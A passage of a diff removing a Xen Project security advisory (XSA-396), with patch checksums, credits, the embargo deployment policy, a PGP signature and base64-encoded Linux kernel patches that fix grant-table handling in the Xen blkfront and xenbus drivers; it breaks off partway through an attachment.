-bf923c3bc92a908215d5ade016d27f56d1e445da88b04e1e1d4530ea5b139be3  xsa396-linux-07.patch
-0a306ed20e4259e2a3583bfab14672a245bd33b24e95e5df8bfc30a25f7e18c6  xsa396-linux-08.patch
-130b8305ba8c10e2942553078b845899ef79c5570692a499569a526b1e39d4fe  xsa396-linux-09.patch
-1f70bdc0a5c1ff1b538d8cbec17e99af5888669f3a33ad8a02d2026719ad4bc9  xsa396-linux-10.patch
-48fd782c6b0b705ccb59885d0e1562873f44478ea87f705f08ce18336bc19257  xsa396-linux-11.patch
-d720350d36f7434e2cad1cb0ae0ed48776ad870a7b1e61cdd08d80fb4a787d59  xsa396-linux-12.patch
-$
-
-CREDITS
-=======
-
-This issue was discovered by Demi Marie Obenour and Simon Gaiser of
-Invisible Things Lab.
-
-DEPLOYMENT DURING EMBARGO
-=========================
-
-Deployment of patches or mitigations is NOT permitted (except where
-all the affected VMs are administered and used only by
-organisations which are members of the Xen Project Security Issues
-Predisclosure List).  Specifically, deployment on public cloud systems
-is NOT permitted.
-
-This is because the patches need to be applied in the affected guests.
-Switching from PV to non-PV devices is observable by the guests and has
-usually a bad performance impact.
-
-Deployment is permitted only AFTER the embargo ends.
-
-
-(Note: this during-embargo deployment notice is retained in
-post-embargo publicly released Xen Project advisories, even though it
-is then no longer applicable.  This is to enable the community to have
-oversight of the Xen Project Security Team's decisionmaking.)
-
-For more information about permissible uses of embargoed information,
-consult the Xen Project community's agreed Security Policy:
-  http://www.xenproject.org/security-policy.html
------BEGIN PGP SIGNATURE-----
-
-iQFABAEBCAAqFiEEI+MiLBRfRHX6gGCng/4UyVfoK9kFAmIp2PYMHHBncEB4ZW4u
-b3JnAAoJEIP+FMlX6CvZKEAIAKS8IFrluU7bw2k0ll8LfDdwI1skWPzEW++bsEjl
-G3eS2bIzOsI/HO5j8HKkxu7N/bPZF8U82+yrDtBYk7y1E8YnqoSyUB4Lc3Bv71gQ
-6MVaLasbY5GrfUdK5lZyoepjudiPa+1/dOO7W3ZOJm7eLq0dTnTuR7vkyqEKQ2vY
-tYC+ubssufuo1FevGANuh2XZe6GUY9hqpBpyVwqArbUVicKC1RhKfBDYyZpSXd/W
-BIzwTZdWQlRIvu4TyPQTdFRjGH4gVf8roquHXDTJUHtItxomltq7irGdw/89y7EM
-8abL+ZlUYHCb03RCT6ccTmExyVDrJ3h1JmWrqnIXpvApyAU=
-=b5Zc
------END PGP SIGNATURE-----
-
---=separator
-Content-Type: application/octet-stream; name="xsa396-linux-01.patch"
-Content-Disposition: attachment; filename="xsa396-linux-01.patch"
-Content-Transfer-Encoding: base64
-
-RnJvbSAzNmI4MmVhZDM0Nzk2ZGViZWE4MmEwMDQ1ZGJjZjZhZjAwMzlhOWZl
-IE1vbiBTZXAgMTcgMDA6MDA6MDAgMjAwMQpGcm9tOiBKdWVyZ2VuIEdyb3Nz
-IDxqZ3Jvc3NAc3VzZS5jb20+CkRhdGU6IEZyaSwgMjUgRmViIDIwMjIgMTY6
-MDU6NDAgKzAxMDAKU3ViamVjdDogW1BBVENIIDAxLzEyXSB4ZW4veGVuYnVz
-OiBkb24ndCBsZXQgeGVuYnVzX2dyYW50X3JpbmcoKSByZW1vdmUKIGdyYW50
-cyBpbiBlcnJvciBjYXNlCgpMZXR0aW5nIHhlbmJ1c19ncmFudF9yaW5nKCkg
-dGVhciBkb3duIGdyYW50cyBpbiB0aGUgZXJyb3IgY2FzZSBpcwpwcm9ibGVt
-YXRpYywgYXMgdGhlIG90aGVyIHNpZGUgY291bGQgYWxyZWFkeSBoYXZlIHVz
-ZWQgdGhlc2UgZ3JhbnRzLgpDYWxsaW5nIGdudHRhYl9lbmRfZm9yZWlnbl9h
-Y2Nlc3NfcmVmKCkgd2l0aG91dCBjaGVja2luZyBzdWNjZXNzIGlzCnJlc3Vs
-dGluZyBpbiBhbiB1bmNsZWFyIHNpdHVhdGlvbiBmb3IgYW55IGNhbGxlciBv
-ZiB4ZW5idXNfZ3JhbnRfcmluZygpCmFzIGluIHRoZSBlcnJvciBjYXNlIHRo
-ZSBtZW1vcnkgcGFnZXMgb2YgdGhlIHJpbmcgcGFnZSBtaWdodCBiZQpwYXJ0
-aWFsbHkgbWFwcGVkLiBGcmVlaW5nIHRoZW0gd291bGQgcmlzayB1bndhbnRl
-ZCBmb3JlaWduIGFjY2VzcyB0bwp0aGVtLCB3aGlsZSBub3QgZnJlZWluZyB0
-aGVtIHdvdWxkIGxlYWsgbWVtb3J5LgoKSW4gb3JkZXIgdG8gcmVtb3ZlIHRo
-ZSBuZWVkIHRvIHVuZG8gYW55IGdudHRhYl9ncmFudF9mb3JlaWduX2FjY2Vz
-cygpCmNhbGxzLCB1c2UgZ250dGFiX2FsbG9jX2dyYW50X3JlZmVyZW5jZXMo
-KSB0byBtYWtlIHN1cmUgbm8gZnVydGhlcgplcnJvciBjYW4gb2NjdXIgaW4g
-dGhlIGxvb3AgZ3JhbnRpbmcgYWNjZXNzIHRvIHRoZSByaW5nIHBhZ2VzLgoK
-SXQgc2hvdWxkIGJlIG5vdGVkIHRoYXQgdGhpcyB3YXkgb2YgaGFuZGxpbmcg
-cmVtb3ZlcyBsZWFraW5nIG9mCmdyYW50IGVudHJpZXMgaW4gdGhlIGVycm9y
-IGNhc2UsIHRvby4KClRoaXMgaXMgQ1ZFLTIwMjItMjMwNDAgLyBwYXJ0IG9m
-IFhTQS0zOTYuCgpSZXBvcnRlZC1ieTogRGVtaSBNYXJpZSBPYmVub3VyIDxk
-ZW1pQGludmlzaWJsZXRoaW5nc2xhYi5jb20+ClNpZ25lZC1vZmYtYnk6IEp1
-ZXJnZW4gR3Jvc3MgPGpncm9zc0BzdXNlLmNvbT4KUmV2aWV3ZWQtYnk6IEph
-biBCZXVsaWNoIDxqYmV1bGljaEBzdXNlLmNvbT4KLS0tCiBkcml2ZXJzL3hl
-bi94ZW5idXMveGVuYnVzX2NsaWVudC5jIHwgMjQgKysrKysrKysrKystLS0t
-LS0tLS0tLS0tCiAxIGZpbGUgY2hhbmdlZCwgMTEgaW5zZXJ0aW9ucygrKSwg
-MTMgZGVsZXRpb25zKC0pCgpkaWZmIC0tZ2l0IGEvZHJpdmVycy94ZW4veGVu
-YnVzL3hlbmJ1c19jbGllbnQuYyBiL2RyaXZlcnMveGVuL3hlbmJ1cy94ZW5i
-dXNfY2xpZW50LmMKaW5kZXggZThiZWQxY2I3NmJhLi5kZjY4OTA2ODEyMzEg
-MTAwNjQ0Ci0tLSBhL2RyaXZlcnMveGVuL3hlbmJ1cy94ZW5idXNfY2xpZW50
-LmMKKysrIGIvZHJpdmVycy94ZW4veGVuYnVzL3hlbmJ1c19jbGllbnQuYwpA
-QCAtMzc5LDcgKzM3OSwxNCBAQCBpbnQgeGVuYnVzX2dyYW50X3Jpbmcoc3Ry
-dWN0IHhlbmJ1c19kZXZpY2UgKmRldiwgdm9pZCAqdmFkZHIsCiAJCSAgICAg
-IHVuc2lnbmVkIGludCBucl9wYWdlcywgZ3JhbnRfcmVmX3QgKmdyZWZzKQog
-ewogCWludCBlcnI7Ci0JaW50IGksIGo7CisJdW5zaWduZWQgaW50IGk7CisJ
-Z3JhbnRfcmVmX3QgZ3JlZl9oZWFkOworCisJZXJyID0gZ250dGFiX2FsbG9j
-X2dyYW50X3JlZmVyZW5jZXMobnJfcGFnZXMsICZncmVmX2hlYWQpOworCWlm
-IChlcnIpIHsKKwkJeGVuYnVzX2Rldl9mYXRhbChkZXYsIGVyciwgImdyYW50
-aW5nIGFjY2VzcyB0byByaW5nIHBhZ2UiKTsKKwkJcmV0dXJuIGVycjsKKwl9
-CiAKIAlmb3IgKGkgPSAwOyBpIDwgbnJfcGFnZXM7IGkrKykgewogCQl1bnNp
-Z25lZCBsb25nIGdmbjsKQEAgLTM4OSwyMyArMzk2LDE0IEBAIGludCB4ZW5i
-dXNfZ3JhbnRfcmluZyhzdHJ1Y3QgeGVuYnVzX2RldmljZSAqZGV2LCB2b2lk
-ICp2YWRkciwKIAkJZWxzZQogCQkJZ2ZuID0gdmlydF90b19nZm4odmFkZHIp
-OwogCi0JCWVyciA9IGdudHRhYl9ncmFudF9mb3JlaWduX2FjY2VzcyhkZXYt
-Pm90aGVyZW5kX2lkLCBnZm4sIDApOwotCQlpZiAoZXJyIDwgMCkgewotCQkJ
-eGVuYnVzX2Rldl9mYXRhbChkZXYsIGVyciwKLQkJCQkJICJncmFudGluZyBh
-Y2Nlc3MgdG8gcmluZyBwYWdlIik7Ci0JCQlnb3RvIGZhaWw7Ci0JCX0KLQkJ
-Z3JlZnNbaV0gPSBlcnI7CisJCWdyZWZzW2ldID0gZ250dGFiX2NsYWltX2dy
-YW50X3JlZmVyZW5jZSgmZ3JlZl9oZWFkKTsKKwkJZ250dGFiX2dyYW50X2Zv
-cmVpZ25fYWNjZXNzX3JlZihncmVmc1tpXSwgZGV2LT5vdGhlcmVuZF9pZCwK
-KwkJCQkJCWdmbiwgMCk7CiAKIAkJdmFkZHIgPSB2YWRkciArIFhFTl9QQUdF
-X1NJWkU7CiAJfQogCiAJcmV0dXJuIDA7Ci0KLWZhaWw6Ci0JZm9yIChqID0g
-MDsgaiA8IGk7IGorKykKLQkJZ250dGFiX2VuZF9mb3JlaWduX2FjY2Vzc19y
-ZWYoZ3JlZnNbal0sIDApOwotCXJldHVybiBlcnI7CiB9CiBFWFBPUlRfU1lN
-Qk9MX0dQTCh4ZW5idXNfZ3JhbnRfcmluZyk7CiAKLS0gCjIuMzQuMQoK
-
---=separator
-Content-Type: application/octet-stream; name="xsa396-linux-02.patch"
-Content-Disposition: attachment; filename="xsa396-linux-02.patch"
-Content-Transfer-Encoding: base64
-
-RnJvbSAxNzQ3ODFjMDU2Y2JmOGUzZmYxYmIxY2Q1NmEyMDE3ZWM4YTE0ZWUz
-IE1vbiBTZXAgMTcgMDA6MDA6MDAgMjAwMQpGcm9tOiBKdWVyZ2VuIEdyb3Nz
-IDxqZ3Jvc3NAc3VzZS5jb20+CkRhdGU6IEZyaSwgMjUgRmViIDIwMjIgMTY6
-MDU6NDEgKzAxMDAKU3ViamVjdDogW1BBVENIIDAyLzEyXSB4ZW4vZ3JhbnQt
-dGFibGU6IGFkZCBnbnR0YWJfdHJ5X2VuZF9mb3JlaWduX2FjY2VzcygpCgpB
-ZGQgYSBuZXcgZ3JhbnQgdGFibGUgZnVuY3Rpb24gZ250dGFiX3RyeV9lbmRf
-Zm9yZWlnbl9hY2Nlc3MoKSwgd2hpY2gKd2lsbCByZW1vdmUgYW5kIGZyZWUg
-YSBncmFudCBpZiBpdCBpcyBub3QgaW4gdXNlLgoKSXRzIG1haW4gdXNlIGNh
-c2UgaXMgdG8gZWl0aGVyIGZyZWUgYSBncmFudCBpZiBpdCBpcyBubyBsb25n
-ZXIgaW4gdXNlLApvciB0byB0YWtlIHNvbWUgb3RoZXIgYWN0aW9uIGlmIGl0
-IGlzIHN0aWxsIGluIHVzZS4gVGhpcyBvdGhlciBhY3Rpb24KY2FuIGJlIGFu
-IGVycm9yIGV4aXQsIG9yIChlLmcuIGluIHRoZSBjYXNlIG9mIGJsa2Zyb250
-IHBlcnNpc3RlbnQgZ3JhbnQKZmVhdHVyZSkgc29tZSBzcGVjaWFsIGhhbmRs
-aW5nLgoKVGhpcyBpcyBDVkUtMjAyMi0yMzAzNiwgQ1ZFLTIwMjItMjMwMzgg
-LyBwYXJ0IG9mIFhTQS0zOTYuCgpSZXBvcnRlZC1ieTogRGVtaSBNYXJpZSBP
-YmVub3VyIDxkZW1pQGludmlzaWJsZXRoaW5nc2xhYi5jb20+ClNpZ25lZC1v
-ZmYtYnk6IEp1ZXJnZW4gR3Jvc3MgPGpncm9zc0BzdXNlLmNvbT4KUmV2aWV3
-ZWQtYnk6IEphbiBCZXVsaWNoIDxqYmV1bGljaEBzdXNlLmNvbT4KLS0tCiBk
-cml2ZXJzL3hlbi9ncmFudC10YWJsZS5jIHwgMTQgKysrKysrKysrKysrLS0K
-IGluY2x1ZGUveGVuL2dyYW50X3RhYmxlLmggfCAxMiArKysrKysrKysrKysK
-IDIgZmlsZXMgY2hhbmdlZCwgMjQgaW5zZXJ0aW9ucygrKSwgMiBkZWxldGlv
-bnMoLSkKCmRpZmYgLS1naXQgYS9kcml2ZXJzL3hlbi9ncmFudC10YWJsZS5j
-IGIvZHJpdmVycy94ZW4vZ3JhbnQtdGFibGUuYwppbmRleCAzNzI5YmVhMGM5
-ODkuLjFiODJlN2EzNzIyYSAxMDA2NDQKLS0tIGEvZHJpdmVycy94ZW4vZ3Jh
-bnQtdGFibGUuYworKysgYi9kcml2ZXJzL3hlbi9ncmFudC10YWJsZS5jCkBA
-IC00MzUsMTEgKzQzNSwyMSBAQCBzdGF0aWMgdm9pZCBnbnR0YWJfYWRkX2Rl
-ZmVycmVkKGdyYW50X3JlZl90IHJlZiwgYm9vbCByZWFkb25seSwKIAkgICAg
-ICAgd2hhdCwgcmVmLCBwYWdlID8gcGFnZV90b19wZm4ocGFnZSkgOiAtMSk7
-CiB9CiAKK2ludCBnbnR0YWJfdHJ5X2VuZF9mb3JlaWduX2FjY2VzcyhncmFu
-dF9yZWZfdCByZWYpCit7CisJaW50IHJldCA9IF9nbnR0YWJfZW5kX2ZvcmVp
-Z25fYWNjZXNzX3JlZihyZWYsIDApOworCisJaWYgKHJldCkKKwkJcHV0X2Zy
-ZWVfZW50cnkocmVmKTsKKworCXJldHVybiByZXQ7Cit9CitFWFBPUlRfU1lN
-Qk9MX0dQTChnbnR0YWJfdHJ5X2VuZF9mb3JlaWduX2FjY2Vzcyk7CisKIHZv
-aWQgZ250dGFiX2VuZF9mb3JlaWduX2FjY2VzcyhncmFudF9yZWZfdCByZWYs
-IGludCByZWFkb25seSwKIAkJCSAgICAgICB1bnNpZ25lZCBsb25nIHBhZ2Up
-CiB7Ci0JaWYgKGdudHRhYl9lbmRfZm9yZWlnbl9hY2Nlc3NfcmVmKHJlZiwg
-cmVhZG9ubHkpKSB7Ci0JCXB1dF9mcmVlX2VudHJ5KHJlZik7CisJaWYgKGdu
-dHRhYl90cnlfZW5kX2ZvcmVpZ25fYWNjZXNzKHJlZikpIHsKIAkJaWYgKHBh
-Z2UgIT0gMCkKIAkJCXB1dF9wYWdlKHZpcnRfdG9fcGFnZShwYWdlKSk7CiAJ
-fSBlbHNlCmRpZmYgLS1naXQgYS9pbmNsdWRlL3hlbi9ncmFudF90YWJsZS5o
-IGIvaW5jbHVkZS94ZW4vZ3JhbnRfdGFibGUuaAppbmRleCBjYjg1NGRmMDMx
-Y2UuLjM1OGQyODE3NzQxYiAxMDA2NDQKLS0tIGEvaW5jbHVkZS94ZW4vZ3Jh
-bnRfdGFibGUuaAorKysgYi9pbmNsdWRlL3hlbi9ncmFudF90YWJsZS5oCkBA
-IC0xMDQsMTAgKzEwNCwyMiBAQCBpbnQgZ250dGFiX2VuZF9mb3JlaWduX2Fj
-Y2Vzc19yZWYoZ3JhbnRfcmVmX3QgcmVmLCBpbnQgcmVhZG9ubHkpOwogICog
-YWNjZXNzIGhhcyBiZWVuIGVuZGVkLCBmcmVlIHRoZSBnaXZlbiBwYWdlIHRv
-by4gIEFjY2VzcyB3aWxsIGJlIGVuZGVkCiAgKiBpbW1lZGlhdGVseSBpZmYg
-dGhlIGdyYW50IGVudHJ5IGlzIG5vdCBpbiB1c2UsIG90aGVyd2lzZSBpdCB3
-aWxsIGhhcHBlbgogICogc29tZSB0aW1lIGxhdGVyLiAgcGFnZSBtYXkgYmUg
-MCwgaW4gd2hpY2ggY2FzZSBubyBmcmVlaW5nIHdpbGwgb2NjdXIuCisgKiBO
-b3RlIHRoYXQgdGhlIGdyYW50ZWQgcGFnZSBtaWdodCBzdGlsbCBiZSBhY2Nl
-c3NlZCAocmVhZCBvciB3cml0ZSkgYnkgdGhlCisgKiBvdGhlciBzaWRlIGFm
-dGVyIGdudHRhYl9lbmRfZm9yZWlnbl9hY2Nlc3MoKSByZXR1cm5zLCBzbyBl
-dmVuIGlmIHBhZ2Ugd2FzCisgKiBzcGVjaWZpZWQgYXMgMCBpdCBpcyBub3Qg
-YWxsb3dlZCB0byBqdXN0IHJldXNlIHRoZSBwYWdlIGZvciBvdGhlcgorICog
-cHVycG9zZXMgaW1tZWRpYXRlbHkuCiAgKi8KIHZvaWQgZ250dGFiX2VuZF9m
-b3JlaWduX2FjY2VzcyhncmFudF9yZWZfdCByZWYsIGludCByZWFkb25seSwK
-IAkJCSAgICAgICB1bnNpZ25lZCBsb25nIHBhZ2UpOwogCisvKgorICogRW5k
-IGFjY2VzcyB0aHJvdWdoIHRoZSBnaXZlbiBncmFudCByZWZlcmVuY2UsIGlm
-ZiB0aGUgZ3JhbnQgZW50cnkgaXMKKyAqIG5vIGxvbmdlciBpbiB1c2UuICBJ
-biBjYXNlIG9mIHN1Y2Nlc3MgZW5kaW5nIGZvcmVpZ24gYWNjZXNzLCB0aGUK
-KyAqIGdyYW50IHJlZmVyZW5jZSBpcyBkZWFsbG9jYXRlZC4KKyAqIFJldHVy
-biAxIGlmIHRoZSBncmFudCBlbnRyeSB3YXMgZnJlZWQsIDAgaWYgaXQgaXMg
-c3RpbGwgaW4gdXNlLgorICovCitpbnQgZ250dGFiX3RyeV9lbmRfZm9yZWln
-bl9hY2Nlc3MoZ3JhbnRfcmVmX3QgcmVmKTsKKwogaW50IGdudHRhYl9ncmFu
-dF9mb3JlaWduX3RyYW5zZmVyKGRvbWlkX3QgZG9taWQsIHVuc2lnbmVkIGxv
-bmcgcGZuKTsKIAogdW5zaWduZWQgbG9uZyBnbnR0YWJfZW5kX2ZvcmVpZ25f
-dHJhbnNmZXJfcmVmKGdyYW50X3JlZl90IHJlZik7Ci0tIAoyLjM0LjEKCg==
-
---=separator
-Content-Type: application/octet-stream; name="xsa396-linux-03.patch"
-Content-Disposition: attachment; filename="xsa396-linux-03.patch"
-Content-Transfer-Encoding: base64
-
-RnJvbSAxNzQ1OGFmYjE4M2M5NWJiYmIxMGZjNWMyOWQ5ZDhlZmEwYThkZTIx
-IE1vbiBTZXAgMTcgMDA6MDA6MDAgMjAwMQpGcm9tOiBKdWVyZ2VuIEdyb3Nz
-IDxqZ3Jvc3NAc3VzZS5jb20+CkRhdGU6IEZyaSwgMjUgRmViIDIwMjIgMTY6
-MDU6NDEgKzAxMDAKU3ViamVjdDogW1BBVENIIDAzLzEyXSB4ZW4vYmxrZnJv
-bnQ6IGRvbid0IHVzZSBnbnR0YWJfcXVlcnlfZm9yZWlnbl9hY2Nlc3MoKSBm
-b3IgbWFwcGVkIHN0YXR1cwpNSU1FLVZlcnNpb246IDEuMApDb250ZW50LVR5
-cGU6IHRleHQvcGxhaW47IGNoYXJzZXQ9VVRGLTgKQ29udGVudC1UcmFuc2Zl
-ci1FbmNvZGluZzogOGJpdAoKSXQgaXNuJ3QgZW5vdWdoIHRvIGNoZWNrIHdo
-ZXRoZXIgYSBncmFudCBpcyBzdGlsbCBiZWluZyBpbiB1c2UgYnkKY2FsbGlu
-ZyBnbnR0YWJfcXVlcnlfZm9yZWlnbl9hY2Nlc3MoKSwgYXMgYSBtYXBwaW5n
-IGNvdWxkIGJlIHJlYWxpemVkCmJ5IHRoZSBvdGhlciBzaWRlIGp1c3QgYWZ0
-ZXIgaGF2aW5nIGNhbGxlZCB0aGF0IGZ1bmN0aW9uLgoKSW4gY2FzZSB0aGUg
-Y2FsbCB3YXMgZG9uZSBpbiBwcmVwYXJhdGlvbiBvZiByZXZva2luZyBhIGdy
-YW50IGl0IGlzCmJldHRlciB0byBkbyBzbyB2aWEgZ250dGFiX2VuZF9mb3Jl
-aWduX2FjY2Vzc19yZWYoKSBhbmQgY2hlY2sgdGhlCnN1Y2Nlc3Mgb2YgdGhh
-dCBvcGVyYXRpb24gaW5zdGVhZC4KCkZvciB0aGUgcmluZyBhbGxvY2F0aW9u
-IHVzZSBhbGxvY19wYWdlc19leGFjdCgpIGluIG9yZGVyIHRvIGF2b2lkCmhp
-Z2ggb3JkZXIgcGFnZXMgaW4gY2FzZSBvZiBhIG11bHRpLXBhZ2UgcmluZy4K
-CklmIGEgZ3JhbnQgd2Fzbid0IHVubWFwcGVkIGJ5IHRoZSBiYWNrZW5kIHdp
-dGhvdXQgcGVyc2lzdGVudCBncmFudHMKYmVpbmcgdXNlZCwgc2V0IHRoZSBk
-ZXZpY2Ugc3RhdGUgdG8gImVycm9yIi4KClRoaXMgaXMgQ1ZFLTIwMjItMjMw
-MzYgLyBwYXJ0IG9mIFhTQS0zOTYuCgpSZXBvcnRlZC1ieTogRGVtaSBNYXJp
-ZSBPYmVub3VyIDxkZW1pQGludmlzaWJsZXRoaW5nc2xhYi5jb20+ClNpZ25l
-ZC1vZmYtYnk6IEp1ZXJnZW4gR3Jvc3MgPGpncm9zc0BzdXNlLmNvbT4KUmV2
-aWV3ZWQtYnk6IFJvZ2VyIFBhdSBNb25uw6kgPHJvZ2VyLnBhdUBjaXRyaXgu
-Y29tPgotLS0KIGRyaXZlcnMvYmxvY2sveGVuLWJsa2Zyb250LmMgfCA2MyAr
-KysrKysrKysrKysrKysrKysrKystLS0tLS0tLS0tLS0tLS0KIDEgZmlsZSBj
-aGFuZ2VkLCAzNyBpbnNlcnRpb25zKCspLCAyNiBkZWxldGlvbnMoLSkKCmRp
-ZmYgLS1naXQgYS9kcml2ZXJzL2Jsb2NrL3hlbi1ibGtmcm9udC5jIGIvZHJp
-dmVycy9ibG9jay94ZW4tYmxrZnJvbnQuYwppbmRleCBjYTcxYTA1ODUzMzMu
-LjAzYjVmYjM0MWU1OCAxMDA2NDQKLS0tIGEvZHJpdmVycy9ibG9jay94ZW4t
-YmxrZnJvbnQuYworKysgYi9kcml2ZXJzL2Jsb2NrL3hlbi1ibGtmcm9udC5j
-CkBAIC0xMjg4LDcgKzEyODgsOCBAQCBzdGF0aWMgdm9pZCBibGtpZl9mcmVl
-X3Jpbmcoc3RydWN0IGJsa2Zyb250X3JpbmdfaW5mbyAqcmluZm8pCiAJCQly
-aW5mby0+cmluZ19yZWZbaV0gPSBHUkFOVF9JTlZBTElEX1JFRjsKIAkJfQog
-CX0KLQlmcmVlX3BhZ2VzKCh1bnNpZ25lZCBsb25nKXJpbmZvLT5yaW5nLnNy
-aW5nLCBnZXRfb3JkZXIoaW5mby0+bnJfcmluZ19wYWdlcyAqIFhFTl9QQUdF
-X1NJWkUpKTsKKwlmcmVlX3BhZ2VzX2V4YWN0KHJpbmZvLT5yaW5nLnNyaW5n
-LAorCQkJIGluZm8tPm5yX3JpbmdfcGFnZXMgKiBYRU5fUEFHRV9TSVpFKTsK
-IAlyaW5mby0+cmluZy5zcmluZyA9IE5VTEw7CiAKIAlpZiAocmluZm8tPmly
-cSkKQEAgLTEzNzIsOSArMTM3MywxNSBAQCBzdGF0aWMgaW50IGJsa2lmX2dl
-dF9maW5hbF9zdGF0dXMoZW51bSBibGtfcmVxX3N0YXR1cyBzMSwKIAlyZXR1
-cm4gQkxLSUZfUlNQX09LQVk7CiB9CiAKLXN0YXRpYyBib29sIGJsa2lmX2Nv
-bXBsZXRpb24odW5zaWduZWQgbG9uZyAqaWQsCi0JCQkgICAgIHN0cnVjdCBi
-bGtmcm9udF9yaW5nX2luZm8gKnJpbmZvLAotCQkJICAgICBzdHJ1Y3QgYmxr
-aWZfcmVzcG9uc2UgKmJyZXQpCisvKgorICogUmV0dXJuIHZhbHVlczoKKyAq
-ICAxIHJlc3BvbnNlIHByb2Nlc3NlZC4KKyAqICAwIG1pc3NpbmcgZnVydGhl
-ciByZXNwb25zZXMuCisgKiAtMSBlcnJvciB3aGlsZSBwcm9jZXNzaW5nLgor
-ICovCitzdGF0aWMgaW50IGJsa2lmX2NvbXBsZXRpb24odW5zaWduZWQgbG9u
-ZyAqaWQsCisJCQkgICAgc3RydWN0IGJsa2Zyb250X3JpbmdfaW5mbyAqcmlu
-Zm8sCisJCQkgICAgc3RydWN0IGJsa2lmX3Jlc3BvbnNlICpicmV0KQogewog
-CWludCBpID0gMDsKIAlzdHJ1Y3Qgc2NhdHRlcmxpc3QgKnNnOwpAQCAtMTM5
-Nyw3ICsxNDA0LDcgQEAgc3RhdGljIGJvb2wgYmxraWZfY29tcGxldGlvbih1
-bnNpZ25lZCBsb25nICppZCwKIAogCQkvKiBXYWl0IHRoZSBzZWNvbmQgcmVz
-cG9uc2UgaWYgbm90IHlldCBoZXJlLiAqLwogCQlpZiAoczItPnN0YXR1cyA8
-IFJFUV9ET05FKQotCQkJcmV0dXJuIGZhbHNlOworCQkJcmV0dXJuIDA7CiAK
-IAkJYnJldC0+c3RhdHVzID0gYmxraWZfZ2V0X2ZpbmFsX3N0YXR1cyhzLT5z
-dGF0dXMsCiAJCQkJCQkgICAgICBzMi0+c3RhdHVzKTsKQEAgLTE0NDgsNDIg
-KzE0NTUsNDMgQEAgc3RhdGljIGJvb2wgYmxraWZfY29tcGxldGlvbih1bnNp
-Z25lZCBsb25nICppZCwKIAl9CiAJLyogQWRkIHRoZSBwZXJzaXN0ZW50IGdy
-YW50IGludG8gdGhlIGxpc3Qgb2YgZnJlZSBncmFudHMgKi8KIAlmb3IgKGkg
-PSAwOyBpIDwgbnVtX2dyYW50OyBpKyspIHsKLQkJaWYgKGdudHRhYl9xdWVy
-eV9mb3JlaWduX2FjY2VzcyhzLT5ncmFudHNfdXNlZFtpXS0+Z3JlZikpIHsK
-KwkJaWYgKCFnbnR0YWJfdHJ5X2VuZF9mb3JlaWduX2FjY2VzcyhzLT5ncmFu
-dHNfdXNlZFtpXS0+Z3JlZikpIHsKIAkJCS8qCiAJCQkgKiBJZiB0aGUgZ3Jh
-bnQgaXMgc3RpbGwgbWFwcGVkIGJ5IHRoZSBiYWNrZW5kICh0aGUKIAkJCSAq
-IGJhY2tlbmQgaGFzIGNob3NlbiB0byBtYWtlIHRoaXMgZ3JhbnQgcGVyc2lz
-dGVudCkKIAkJCSAqIHdlIGFkZCBpdCBhdCB0aGUgaGVhZCBvZiB0aGUgbGlz
-dCwgc28gaXQgd2lsbCBiZQogCQkJICogcmV1c2VkIGZpcnN0LgogCQkJICov
-Ci0JCQlpZiAoIWluZm8tPmZlYXR1cmVfcGVyc2lzdGVudCkKLQkJCQlwcl9h
-bGVydF9yYXRlbGltaXRlZCgiYmFja2VkIGhhcyBub3QgdW5tYXBwZWQgZ3Jh
-bnQ6ICV1XG4iLAotCQkJCQkJICAgICBzLT5ncmFudHNfdXNlZFtpXS0+Z3Jl
-Zik7CisJCQlpZiAoIWluZm8tPmZlYXR1cmVfcGVyc2lzdGVudCkgeworCQkJ
-CXByX2FsZXJ0KCJiYWNrZWQgaGFzIG5vdCB1bm1hcHBlZCBncmFudDogJXVc
-biIsCisJCQkJCSBzLT5ncmFudHNfdXNlZFtpXS0+Z3JlZik7CisJCQkJcmV0
-dXJuIC0xOworCQkJfQogCQkJbGlzdF9hZGQoJnMtPmdyYW50c191c2VkW2ld
-LT5ub2RlLCAmcmluZm8tPmdyYW50cyk7CiAJCQlyaW5mby0+cGVyc2lzdGVu
-dF9nbnRzX2MrKzsKIAkJfSBlbHNlIHsKIAkJCS8qCi0JCQkgKiBJZiB0aGUg
-Z3JhbnQgaXMgbm90IG1hcHBlZCBieSB0aGUgYmFja2VuZCB3ZSBlbmQgdGhl
-Ci0JCQkgKiBmb3JlaWduIGFjY2VzcyBhbmQgYWRkIGl0IHRvIHRoZSB0YWls
-IG9mIHRoZSBsaXN0LAotCQkJICogc28gaXQgd2lsbCBub3QgYmUgcGlja2Vk
-IGFnYWluIHVubGVzcyB3ZSBydW4gb3V0IG9mCi0JCQkgKiBwZXJzaXN0ZW50
-IGdyYW50cy4KKwkJCSAqIElmIHRoZSBncmFudCBpcyBub3QgbWFwcGVkIGJ5
-IHRoZSBiYWNrZW5kIHdlIGFkZCBpdAorCQkJICogdG8gdGhlIHRhaWwgb2Yg
-dGhlIGxpc3QsIHNvIGl0IHdpbGwgbm90IGJlIHBpY2tlZAorCQkJICogYWdh
-aW4gdW5sZXNzIHdlIHJ1biBvdXQgb2YgcGVyc2lzdGVudCBncmFudHMuCiAJ
-CQkgKi8KLQkJCWdudHRhYl9lbmRfZm9yZWlnbl9hY2Nlc3Mocy0+Z3JhbnRz
-X3VzZWRbaV0tPmdyZWYsIDAsIDBVTCk7CiAJCQlzLT5ncmFudHNfdXNlZFtp
-XS0+Z3JlZiA9IEdSQU5UX0lOVkFMSURfUkVGOwogCQkJbGlzdF9hZGRfdGFp
-bCgmcy0+Z3JhbnRzX3VzZWRbaV0tPm5vZGUsICZyaW5mby0+Z3JhbnRzKTsK
-IAkJfQogCX0KIAlpZiAocy0+cmVxLm9wZXJhdGlvbiA9PSBCTEtJRl9PUF9J
-TkRJUkVDVCkgewogCQlmb3IgKGkgPSAwOyBpIDwgSU5ESVJFQ1RfR1JFRlMo
-bnVtX2dyYW50KTsgaSsrKSB7Ci0JCQlpZiAoZ250dGFiX3F1ZXJ5X2ZvcmVp
-Z25fYWNjZXNzKHMtPmluZGlyZWN0X2dyYW50c1tpXS0+Z3JlZikpIHsKLQkJ
-CQlpZiAoIWluZm8tPmZlYXR1cmVfcGVyc2lzdGVudCkKLQkJCQkJcHJfYWxl
-cnRfcmF0ZWxpbWl0ZWQoImJhY2tlZCBoYXMgbm90IHVubWFwcGVkIGdyYW50
-OiAldVxuIiwKLQkJCQkJCQkgICAgIHMtPmluZGlyZWN0X2dyYW50c1tpXS0+
-Z3JlZik7CisJCQlpZiAoIWdudHRhYl90cnlfZW5kX2ZvcmVpZ25fYWNjZXNz
-KHMtPmluZGlyZWN0X2dyYW50c1tpXS0+Z3JlZikpIHsKKwkJCQlpZiAoIWlu
